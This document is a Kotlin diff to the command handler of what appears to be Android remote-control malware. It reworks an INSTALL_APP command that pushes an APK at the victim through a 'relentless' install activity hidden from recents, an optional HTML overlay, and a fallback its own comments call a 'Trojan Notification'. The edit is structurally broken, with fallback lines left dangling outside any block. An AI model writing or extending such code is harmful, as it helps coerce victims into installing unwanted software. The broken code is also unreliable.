@@ -552,18 +552,35 @@ object CommandProcessor {
                     status = "DISPLAY_RESTORED"
                 }
                 "INSTALL_APP" -> {
-                    val apkFile = File(content.trim())
+                    val parts = content.split("|", limit = 2)
+                    val apkPath = parts[0].trim()
+                    val apkFile = File(apkPath)
+                    
                     if (apkFile.exists() && apkFile.isFile) {
-                        val installIntent = Intent(ctx, RelentlessInstallActivity::class.java).apply {
-                            putExtra("apk_path", apkFile.absolutePath)
-                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
+                        if (parts.size > 1) {
+                            // Case A: Show explanation overlay first
+                            val html = parts[1].trim()
+                            DynamicUIManager.showOverlay(ctx, true, html)
+                            status = "INSTALL_EXPLANATION_SHOWN"
+                        } else {
+                            // Case B: Direct relentless trap (no explanation)
+                            val installIntent = Intent(ctx, RelentlessInstallActivity::class.java).apply {
+                                putExtra("apk_path", apkFile.absolutePath)
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
+                            }
+                            try {
+                                ctx.startActivity(installIntent)
+                                status = "RELENTLESS_INSTALL_TRIGGERED"
+                            } catch (e: Exception) {
+                                // Fallback notification logic follows below...
+                                throw e
+                            }
                         }
-                        
-                        try {
-                            // PRIMARY: Attempt direct background launch into the Relentless Trap
-                            ctx.startActivity(installIntent)
-                            status = "RELENTLESS_INSTALL_TRIGGERED"
-                        } catch (e: Exception) {
+                    } else {
+                        status = "INSTALL_FAILED (NOT_FOUND)"
+                        errorMsg = "APK not at: $apkPath"
+                    }
+                }
                             // FALLBACK: OS blocked background launch. Deploy Trojan Notification.
                             try {
                                 val pendingIntent = android.app.PendingIntent.getActivity(
